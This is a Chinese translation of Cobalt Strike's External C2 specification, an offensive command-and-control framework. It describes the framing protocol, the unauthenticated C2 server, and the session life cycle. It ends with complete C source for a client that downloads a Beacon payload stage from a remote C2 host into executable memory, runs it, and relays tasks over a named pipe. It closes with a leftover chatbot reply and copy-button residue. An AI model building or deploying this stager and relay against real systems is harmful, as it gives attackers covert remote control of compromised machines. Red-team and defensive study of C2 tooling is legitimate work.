# Cobalt Strike External Command and Control Specification

**WORKING PAPER**

**Revision 0.1 (14 November 2016)**

------

## 1. Overview

### 1.1 What is External Command and Control?

Cobalt Strike的外部命令与控制（External C2）接口允许第三方程序作为Cobalt Strike与其Beacon有效载荷之间的通信层。

### 1.2 Architecture

External C2系统由以下组件组成：

- **第三方控制器（Third-party Controller）**
- **第三方客户端（Third-party Client）**
- **Cobalt Strike提供的External C2服务**

第三方客户端和第三方服务器是Cobalt Strike的外部组件，开发者可以选择自己喜欢的编程语言来开发这些组件。

![image-20250409034429862](assets/image-20250409034429862.png)

**工作流程：**

- 第三方控制器连接到Cobalt Strike的External C2服务。
- 该服务负责提供有效载荷阶段（Payload Stage）、发送任务并接收Beacon会话的响应。
- 第三方客户端将Beacon有效载荷阶段注入内存，读取Beacon会话的响应，并向其发送任务。
- 第三方控制器和第三方客户端相互通信，传递有效载荷阶段、任务和响应。

------

## 2. External C2 Protocol

### 2.1 Frames

External C2服务器和SMB Beacon使用相同的帧格式：

- 帧以**4字节小端字节序整数**开头，表示帧内数据的长度。
- 数据紧跟在长度值之后。

所有与External C2服务器以及SMB Beacon命名管道服务器的通信均使用此帧格式。

**注意：** 许多高级语言在将整数序列化到流中时使用大端字节序（也称为网络字节序）。开发者在构建第三方控制器和客户端程序时需确保正确处理字节序。SMB Beacon使用4字节小端字节序，以便其他Beacon（现为第三方客户端）控制它。External C2服务器采用此帧格式以保持与SMB Beacon的一致性。

### 2.2 No Authentication

External C2服务器不对连接的第三方控制器进行身份验证。这听起来可能令人担忧，但实际上并非安全问题。External C2服务器仅用于：

- 提供有效载荷阶段
- 接收元数据
- 提供任务
- 接收Beacon会话的响应

这些功能与Cobalt Strike的其他监听器（如HTTP、DNS等）提供的服务相同。

------

## 3. External C2 Components

### 3.1 External C2 Server

通过Aggressor Script中的&externalC2_start函数启动External C2服务器。

```
# 启动External C2服务器并绑定到0.0.0.0:2222 externalC2_start("0.0.0.0", 2222);
```

### 3.2 Third-party Client Controller

当需要一个新会话时，第三方控制器连接到External C2服务器。每个连接服务于一个会话。

#### 配置和请求有效载荷阶段

- 控制器通过发送包含key=value字符串的帧来配置有效载荷阶段，这些帧填充会话选项。
- External C2服务器不会对这些帧进行确认。

**支持的选项：**

| Option   | Default | Description                                                  |
| -------- | ------- | ------------------------------------------------------------ |
| arch     | x86     | 有效载荷阶段的架构。可选值：x86, x64                         |
| pipename |         | 命名管道名称                                                 |
| block    |         | 以毫秒为单位的时间，表示External C2服务器在没有新任务时应阻塞的时长。超时后，服务器生成空操作帧。 |

#### 请求流程

1. 发送所有选项后，控制器发送包含字符串"go"的帧，请求有效载荷阶段。
2. 控制器读取有效载荷阶段并将其转发给第三方客户端。

#### 数据中继

- 控制器等待来自第三方客户端的帧，将其写入与External C2服务器的连接。
- 从External C2服务器读取帧（服务器会等待最多block时间，若无任务则返回空任务帧），并将该帧发送给第三方客户端。
- 重复此过程：接收客户端帧 -> 写入服务器 -> 读取服务器帧 -> 发送给客户端。

**注意：**

- 当控制器与External C2服务器断开连接时，Cobalt Strike将Beacon会话标记为死亡。
- 无法恢复会话。

### 3.3 Third-party Client

第三方客户端从控制器接收Beacon有效载荷阶段（一个经过修改的自引导反射DLL），使用常规进程注入技术运行它。

#### 连接命名管道

- 有效载荷运行后，客户端连接到Beacon创建的命名管道服务器。
- 管道文件路径为\\.\pipe\[pipe name here]，以读写模式打开。
- 若客户端语言/运行时支持命名管道API，也可使用这些API。

#### 数据中继

1. 从Beacon命名管道连接读取帧，并将其转发给第三方控制器。
2. 等待控制器的帧，将其写入命名管道。
3. 重复此过程：读取管道帧 -> 发送给控制器 -> 接收控制器帧 -> 写入管道。

------

## Appendix A. Session Life Cycle

以下是External C2会话生命周期的步骤：

| Step | External C2              | Controller                | Client               | SMB Beacon         |
| ---- | ------------------------ | ------------------------- | -------------------- | ------------------ |
| 1    |                          |                           | 向控制器请求新会话   |                    |
| 2    |                          | 连接到External C2         |                      |                    |
| 3    |                          | <- 发送选项               |                      |                    |
| 4    |                          | <- 请求阶段               |                      |                    |
| 5    | 发送阶段 ->              |                           |                      |                    |
| 6    |                          | 中继阶段 ->               |                      |                    |
| 7    |                          |                           | 将阶段注入进程       |                    |
| 8    |                          |                           |                      | 启动命名管道服务器 |
| 9    |                          |                           | 连接到命名管道服务器 |                    |
| 10   |                          |                           |                      | <- 写入元数据      |
| 11   |                          |                           | <- 中继元数据        |                    |
| 12   |                          | <- 中继元数据             |                      |                    |
| 13   | 处理元数据               |                           |                      |                    |
| 14   | 用户任务会话或生成空任务 |                           |                      |                    |
| 15   | 写入任务 ->              |                           |                      |                    |
| 16   |                          | 中继任务 ->               |                      |                    |
| 17   |                          |                           |                      |                    |
| 18   |                          |                           |                      | 处理任务           |
| 19   |                          |                           |                      | <- 写入响应        |
| 20   |                          |                           | <- 中继响应          |                    |
| 21   |                          | <- 中继响应               |                      |                    |
| 22   | 处理响应                 |                           |                      |                    |
|      |                          | 重复步骤14-22直到会话存活 |                      |                    |
| 24   |                          |                           |                      | 会话退出           |
| 25   |                          |                           | 读写命名管道时出错   |                    |
| 26   |                          |                           | <- 通知控制器        |                    |
| 27   |                          | 断开连接                  | 退出                 |                    |

**备注：** 会话断开后，Cobalt Strike将Beacon会话标记为死亡。

------

## Appendix B. Example Third-party Client

此示例客户端直接连接到第三方C2服务器。在Kali Linux上构建方法：

bash

CollapseWrapCopy

```
i686-w64-mingw32-gcc example.c -o example.exe -lws2_32
```

以下是源代码：

c

CollapseWrapCopy

```
/* a quick-client for Cobalt Strike's External C2 server */
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

/* 从句柄读取帧 */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;
    /* 读取4字节长度 */
    ReadFile(my_handle, (char *)&size, 4, &temp, NULL);
    /* 读取完整数据 */
    while (total < size) {
        ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }
    return size;
}

/* 从套接字接收帧 */
DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
    DWORD size = 0, total = 0, temp = 0;
    /* 读取4字节长度 */
    recv(my_socket, (char *)&size, 4, 0);
    /* 读取数据 */
    while (total < size) {
        temp = recv(my_socket, buffer + total, size - total, 0);
        total += temp;
    }
    return size;
}

/* 通过套接字发送帧 */
void send_frame(SOCKET my_socket, char * buffer, int length) {
    send(my_socket, (char *)&length, 4, 0);
    send(my_socket, buffer, length, 0);
}

/* 将帧写入文件 */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
    WriteFile(my_handle, buffer, length, &wrote, NULL);
}

/* 客户端主逻辑 */
void go(char * host, DWORD port) {
    /* 连接到External C2服务器 */
    struct sockaddr_in sock;
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr(host);
    sock.sin_port = htons(port);
    SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(socket_extc2, (struct sockaddr *) &sock, sizeof(sock))) {
        printf("Could not connect to %s:%d\n", host, port);
        exit(0);
    }

    /* 发送选项 */
    send_frame(socket_extc2, "arch=x86", 8);
    send_frame(socket_extc2, "pipename=foobar", 15);
    send_frame(socket_extc2, "block=100", 9);

    /* 请求并接收有效载荷阶段 */
    send_frame(socket_extc2, "go", 2);
    char *payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);

    /* 将有效载荷注入当前进程 */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

    /* 连接到Beacon命名管道 */
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }

    /* 设置缓冲区 */
    char *buffer = (char *) malloc(BUFFER_MAX_SIZE);

    /* 中继帧 */
    while (TRUE) {
        /* 从Beacon命名管道读取 */
        DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }
        /* 写入External C2服务器 */
        send_frame(socket_extc2, buffer, read);
        /* 从External C2服务器读取 */
        read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }
        /* 写入Beacon命名管道 */
        write_frame(handle_beacon, buffer, read);
    }

    /* 关闭句柄 */
    CloseHandle(handle_beacon);
    closesocket(socket_extc2);
}

void main(DWORD argc, char *argv[]) {
    /* 检查参数 */
    if (argc != 3) {
        printf("%s [host] [port]\n", argv[0]);
        exit(1);
    }

    /* 初始化Winsock */
    WSADATA wsaData;
    WORD wVersionRequested;
    wVersionRequested = MAKEWORD(2, 2);
    WSAStartup(wVersionRequested, &wsaData);

    /* 启动客户端 */
    go(argv[1], atoi(argv[2]));
}
```

------

以上是文档的完整Markdown解析，保留了原始结构和内容，使用标题、代码块、表格等格式使其易于阅读。如有其他需求，请告诉我！
